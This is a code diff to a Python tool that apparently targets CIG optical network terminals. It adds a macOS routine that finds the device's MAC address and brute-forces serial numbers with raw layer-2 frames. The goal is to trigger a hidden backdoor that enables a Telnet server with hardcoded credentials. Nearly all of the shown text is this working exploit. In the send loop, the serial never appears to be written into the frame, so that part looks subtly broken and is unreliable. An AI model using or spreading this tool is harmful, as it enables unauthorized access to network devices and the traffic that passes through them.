@@ -547,6 +547,67 @@ def discoverserial_cigbackdoor(args):
             if process_backdoor_block(args.onu_ip, s, pkt, next_serial_block):
                 break
 
+def discoverserial_cigbackdoor_mac(args):
+    try:
+        from scapy.all import (
+            Ether, sendp, srp1, ARP, conf,
+            get_if_hwaddr, Raw, raw
+        )
+    except ImportError:
+        print("[-] scapy not found, install via pip: pip install scapy")
+        sys.exit(1)
+
+    try:
+        with Telnet(args.onu_ip, 23, 2) as tn:
+            if b"Login as:" not in tn.read_until(b"Login as:", timeout=2):
+                print("[-] Unexpected Telnet prompt, wrong network?")
+                return
+        print("[+] Target reachable via Telnet. Querying ARP entry...")
+    except Exception as e:
+        print(f"[-] Telnet connection failed: {e}")
+        return
+
+    iface = conf.route.route(args.onu_ip)[0]
+    arp_resp = srp1(
+        Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=args.onu_ip),
+        timeout=2,
+        iface=iface,
+        verbose=False
+    )
+    if not arp_resp:
+        print("[-] No ARP response, ensure L2 adjacency.")
+        return
+
+    victim_mac = arp_resp.hwsrc
+    src_mac = get_if_hwaddr(iface)
+    print(f"[+] Target {args.onu_ip} at MAC {victim_mac} via {iface} (src {src_mac})")
+
+    pkt = CIGBackdoorPacket()
+    pkt.dst_mac = tuple(int(o, 16) for o in victim_mac.split(':'))
+    pkt.src_mac = tuple(int(o, 16) for o in src_mac.split(':'))
+    pkt.ethertype = 0xc199
+    pkt.enable_hardcoded_creds = 1
+    pkt.operation = 0xeeee  # enable telnet server
+    pkt.command = 0xffffffff
+
+    raw_socket = conf.L2socket(iface=iface)
+    serials = serial_generator(*serial_search_params(args))
+
+    while True:
+        block = list(islice(serials, 1000))
+        if not block:
+            print("[-] Exhausted serials, try expanding range.")
+            break
+
+        payload = raw(pkt)
+        for serial in block:
+            frame = Ether(src=src_mac, dst=victim_mac, type=0xc199)/Raw(payload)
+            sendp(frame, iface=iface, verbose=False)
+
+        if process_backdoor_block(args.onu_ip, raw_socket, pkt, block):
+            print("[+] Serial found and backdoor activated!")
+            break
+
 def telnet(args):
     with CigTelnet(args.onu_ip, args.serial) as tn:
         tn.interact()
@@ -799,12 +860,14 @@ if __name__=="__main__":
     parse_discover.add_argument("--threads", default=2, type=int)
     parse_discover.set_defaults(func=discoverserial)
 
+    parse_discover_cig = s.add_parser("discoverserial_cig")
+    parse_discover_cig.add_argument("--onu_ip", default="192.168.100.1")
+    parse_discover_cig.add_argument("--year", default=None, type=lambda x: int(x) % 100)
+    parse_discover_cig.add_argument("--month", default=None, type=lambda x: int(x) & 0xf)
     if sys.platform == "linux":
-        parse_discover_cig = s.add_parser("discoverserial_cig")
-        parse_discover_cig.add_argument("--onu_ip", default="192.168.100.1")
-        parse_discover_cig.add_argument("--year", default=None, type=lambda x: int(x) % 100)
-        parse_discover_cig.add_argument("--month", default=None, type=lambda x: int(x) & 0xf)
         parse_discover_cig.set_defaults(func=discoverserial_cigbackdoor)
+    elif sys.platform == "darwin":
+        parse_discover_cig.set_defaults(func=discoverserial_cigbackdoor_mac)
 
     parse_telnet = s.add_parser("telnet")
     parse_telnet.add_argument("--onu_ip", default="192.168.100.1")
